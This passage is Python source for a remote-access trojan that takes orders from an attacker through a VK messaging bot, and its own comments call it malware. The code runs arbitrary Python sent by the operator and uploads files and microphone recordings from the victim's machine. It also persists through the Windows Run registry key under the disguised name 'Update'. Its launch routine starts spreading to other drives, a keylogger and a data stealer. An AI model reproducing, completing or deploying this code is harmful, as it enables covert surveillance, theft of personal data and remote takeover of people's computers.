            # Returning.
            return

            # Getting tags.
        _message_tags = _message_arguments[0]
        _message_arguments.pop(0)

        if _message_tags == "alive":
            # If this is network command (That is work without tags and for all).

            if user_is_admin(_peer):
                # If user is admin and allowed to make commands.

                # Getting current time.
                _current_time = datetime.datetime.now().strftime("%H:%M:%S")

                # Answering that we in network.
                _response_text = f"Alive! Time: {_current_time}"
            else:
                # If not is admin.

                # Answering with an error.
                _response_text = MESSAGE_NOT_ADMIN
        else:
            # If this is not alive command.

            if list_intersects(parse_tags(_message_tags), __TAGS):
                # If we have one or more tag from our tags.

                if user_is_admin(_peer):
                    # If user is admin.

                    if len(_message_arguments) == 0:
                        # If there is no tags + command.

                        # Responding with error.
                        _response_text = "Invalid request! Message can`t be parsed! Try: tag1, tag2; command; args"
                    else:
                        # If there is no error.

                        # Getting command itself.
                        _message_command = str(_message_arguments[0]).lower().replace(" ", "")
                        _message_arguments.pop(0)

                        # Getting arguments (Joining all left list indices together).
                        _command_arguments = ";".join(_message_arguments)

                        # Executing command.
                        _execution_response = client_execute_command(_message_command, _command_arguments, _event)

                        if type(_execution_response) == list:
                            # If response is list.

                            # Uploading attachment to the message.

                            if len(_execution_response) < 3:
                                # If invalid length.

                                # Getting error response.
                                _response_text = "Invalid attachment response from the executing of command!"
                            else:
                                # If all correct.

                                # Uploading.

                                # Getting values.
                                _uploading_path = _execution_response[0]
                                _uploading_title = _execution_response[1]
                                _uploading_type = _execution_response[2]

                                if _uploading_type == "photo":
                                    # If this is just photo.

                                    # Uploading photo on the server.
                                    _uploading_result = server_upload_photo(_uploading_path)

                                    # Moving result to attachment.
                                    _response_text = _uploading_title
                                    _response_attachment = _uploading_result
                                elif _uploading_type in ("doc", "audio_message"):
                                    # If this is document or audio message.

                                    # Uploading file on the server.
                                    _uploading_result = server_upload_document(_uploading_path, _uploading_title,
                                                                               _peer, _uploading_type)

                                    if type(_uploading_result) == str:
                                        # If uploading file result is string then all OK.

                                        # Setting response.
                                        _response_text = _uploading_title
                                        _response_attachment = _uploading_result
                                    else:
                                        # If there is an error.

                                        # Setting response.
                                        _response_text = f"Error when uploading document: {_uploading_result}"
                        else:
                            # If default string response.
                            # Getting text.
                            _response_text = _execution_response
                else:
                    # If not is admin.

                    # Answering with an error.
                    _response_text = MESSAGE_NOT_ADMIN
            else:
                # If lists of tags not intersects.

                # Returning.
                return
    except Exception as _exception:  # noqa
        # If there an exception.

        # Getting exception answer.
        _response_text = f"Oops... There is exception while victim try to answer message. " \
                         f"Exception information: {_exception}"

    # Answering server.
    if _response_text is not None:
        # If response was not void from execution function.

        # Answering.
        server_message(f"{_response_text}", _response_attachment, _peer)
    else:
        # None answer.
        server_message(f"Void... (No response)", _response_attachment, _peer)


def stealer_is_already_worked() -> bool:
    # @function stealer_is_already_worked()
    # @returns bool
    # @description Function that returns is we already worked stealer or not.

    # Getting path to secret file.
    _path = __FOLDER + "version.dat"

    if not os.path.exists(_path):
        # If secret file not exists.

        # Validating file.
        filesystem_build_path(_path)

        # Creating file.
        with open(_path, "w") as _file:
            _file.write("")

        # Returning false.
        return False

    # Returning true if file exists.
    return True


def server_upload_photo(_path: str) -> str:
    # @function server_upload_photo()
    # @returns str
    # @description Function that  uploads photo on the server.

    # Getting uploader.
    _uploader = vk_api.upload.VkUpload(__SERVER_API)

    # Uploading photo.
    _photo = _uploader.photo_messages(_path)
    _photo = _photo[0]

    if "owner_id" in _photo and "id" in _photo and "access_key" in _photo:
        # If photo have all those fields.

        # Getting photo fields.
        _owner_id = _photo['owner_id']
        _photo_id = _photo['id']
        _access_key = _photo['access_key']

        # Returning photo URN.
        return f'photo{_owner_id}_{_photo_id}_{_access_key}'

    # Returning blank.
    return ""


def execute_python(_code: str, _globals: dict, _locals: dict) -> any:
    # @function server_upload_photo()
    # @returns any
    # @description Function that executes python code and returns it out in variable out.

    # Getting global out.
    global out

    # Getting clean code.
    _clean_code = _code.replace("&gt;", ">").replace("&lt;", "<").replace('&quot;', "'").replace('&tab', '   ')

    try:
        # Trying to execute.

        # Executing replaced code.
        exec(_clean_code, _globals, _locals)
    except Exception as _exception:  # noqa
        # If there is an error.

        # Returning.
        return f"Python code exception: {_exception}"

    try:
        # Trying to return out.

        # Returning out.
        return out
    except NameError:
        # If there is an name error.

        # Returning.
        return f"Python code does not return output! Write in out"


def client_execute_command(_command_name: str, _arguments: str, _event) -> str:
    # @function client_execute_command()
    # @returns str
    # @description Function that executes python code and returns it out in variable out.

    for _command in __COMMANDS_FUNCTION:  # noqa
        # For all commands names in commands dict.

        if _command_name == _command:
            # If it is this commands.

            # Executing command and returning result.
            return __COMMANDS_FUNCTION[_command](_arguments, _event)  # noqa

    # Default answer.
    return f"Invalid command {_command_name}! Write help command and get all commands!"


def autorun_register() -> None:
    # @function autorun_register()
    # @returns None
    # @description Function that registers current executable file to the autorun.

    if DISABLED_AUTORUN:
        # If autorun is disabled.

        # Return.
        return

    if executable_get_extension != "exe":
        # If this is not exe file.

        # Returning.
        return

    try:
        # Trying to import winreg module.

        # Importing.
        import winreg
    except ImportError:
        # If there is ImportError.

        # Debug message.
        debug_message("Cannot add self to the autorun! Could not import module winreg")

        # Returning.
        return

    try:
        # Trying to add to the autorun.

        # Getting executable path.
        _executable_path = __FOLDER + "update." + executable_get_extension()

        if not os.path.exists(_executable_path):
            # If no file there (We don't add this already.

            # Building path.
            filesystem_build_path(_executable_path)

            # Copying executable there.
            shutil.copyfile(sys.argv[0], _executable_path)

        # Opening key.
        _registry_key = winreg.OpenKey(key=winreg.HKEY_CURRENT_USER,
                                       sub_key="Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                                       reserved=0, access=winreg.KEY_ALL_ACCESS)

        # Adding autorun.
        winreg.SetValueEx(_registry_key, "Update", 0, winreg.REG_SZ, _executable_path)

        # Closing key.
        winreg.CloseKey(_registry_key)
    except Exception as _exception:  # noqa
        # If error occurred.

        # Debug message.
        debug_message(f"Can`t add self to the registry! Error: {_exception}")


def autorun_unregister() -> None:
    # @function autorun_unregister()
    # @returns None
    # @description Function that unregisters current executable file to the autorun.

    if DISABLED_AUTORUN:
        # If autorun is disabled.

        # Return.
        return

    if executable_get_extension != "exe":
        # If this is not exe file.

        # Returning.
        return

    try:
        # Trying to import winreg module.

        # Importing.
        import winreg
    except ImportError:
        # If there is ImportError.

        # Debug message.
        debug_message("Cannot remove self to the autorun! Could not import module winreg")

        # Returning.
        return

    try:
        # Trying to remove autorun.

        # Opening key.
        _registry_key = winreg.OpenKey(key=winreg.HKEY_CURRENT_USER,
                                       sub_key="Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                                       reserved=0, access=winreg.KEY_ALL_ACCESS)

        # Deleting autorun.
        winreg.DeleteValue(_registry_key, "Update")

        # Closing key.
        winreg.CloseKey(_registry_key)
    except Exception as _exception:  # noqa
        # If error occurred.

        # Debug message.
        debug_message(f"Не удалось добавить себя в автозагрузки! Ошибка: {_exception}")


def server_upload_document(_path: str, _title: str, _peer: int, _type: str = "doc") -> str:
    # @function server_upload_document()
    # @returns str or list
    # @description Function that uploads document on the server and returns it.

    try:
        # Trying to upload document.

        # Getting api for the uploader.
        _server_api = __SERVER_API.get_api()  # noqa

        # Getting upload server.
        _upload_server = _server_api.docs.getMessagesUploadServer(type=_type, peer_id=_peer)['upload_url']

        # Posting file on the server.
        _request = json.loads(requests.post(_upload_server, files={'file': open(_path, 'rb')}).text)

        if "file" in _request:
            # If there is all fields in response.

            # Saving file to the docs.
            _request = _server_api.docs.save(file=_request['file'], title=_title, tags=[])

            # Returning document.
            return f"doc{_request[_type]['owner_id']}_{_request[_type]['id']}"
        else:
            # If there is not all fields.

            # Debug message.
            debug_message(f"Error when uploading document (Request)!")

            # Returning request as error.
            return [_request]  # noqa
    except Exception as _exception:  # noqa
        # If there is error.

        # Debug message.
        debug_message(f"Error when uploading document (Exception)! Exception: {_exception}")

        # Returning exception.
        return [_exception]  # noqa


def record_microphone(_path, seconds: int = 1) -> None:
    # @function record_microphone()
    # @returns None
    # @description Function that records microphone.

    # Importing.
    try:
        # Trying to import modules.

        # Importing.
        import pyaudio
        import wave
    except ImportError:
        # If there is import error.

        # Not supported.
        debug_message(
            "This command does not supported on selected PC! (opencv-python (CV2) module is not installed)")  # noqa

        # Returning.
        return

    # Creating audio port.
    audio = pyaudio.PyAudio()

    # Opening audio stream.
    stream = audio.open(format=pyaudio.paInt16, channels=1, rate=44100, frames_per_buffer=1024, input=True)

    # Frames list.
    frames = []

    # Writing data stream.
    for _ in range(0, int(44100 / 1024 * int(seconds))):
        data = stream.read(1024)
        frames.append(data)

    # Stopping.
    stream.stop_stream()
    stream.close()
    audio.terminate()

    # Validating filename.
    filesystem_build_path(_path)

    # Save recording as wav file.
    file = wave.open(_path, 'wb')
    file.setnchannels(1)
    file.setsampwidth(audio.get_sample_size(pyaudio.paInt16))
    file.setframerate(44100)
    file.writeframes(b''.join(frames))
    file.close()


def launch() -> None:
    # @function launch()
    # @returns None
    # @description Function that launches all the system of the malware.
    try:
        # Trying to initialise malware.

        # Asserting operating system, exiting if the operation system is not supported.
        # Supported:
        # Windows (Fully supported), Linux (Partially supported)
        assert_operating_system()

        # Setting folder path for later file manipulations.
        set_folder_path()

        # Initialising functions for the remote access.
        initialise_commands()

        # Loading tags from the system.
        load_tags()

        # Loading name from the system.
        load_name()

        # Connecting to the server.
        server_connect()

        # Starting spreading on the other drives.
        spreading_start()

        # Starting keylogger that will steals all keys pressed.
        keylogger_start()

        # Registering in the autorun.
        autorun_register()

        # Message that we connected to the network.
        server_message(f"Connected to the network! (His tags: {', '.join(__TAGS)})")

        # Registering exit_handler() as handler for exit.
        atexit.register(exit_handler)

        # Stealing all of the data.
        stealer_steal_data()

        # Starting listening messages.
        server_listen()
    except Exception as _exception:  # noqa
        # If there is exception occurred.

        # Showing debug message to the developer.
        debug_message(f"Oops... Exception occurred in function launch()! "
                      f"Full exception information - {_exception}")


# Entry point of the malware, calling launch function to start all systems.
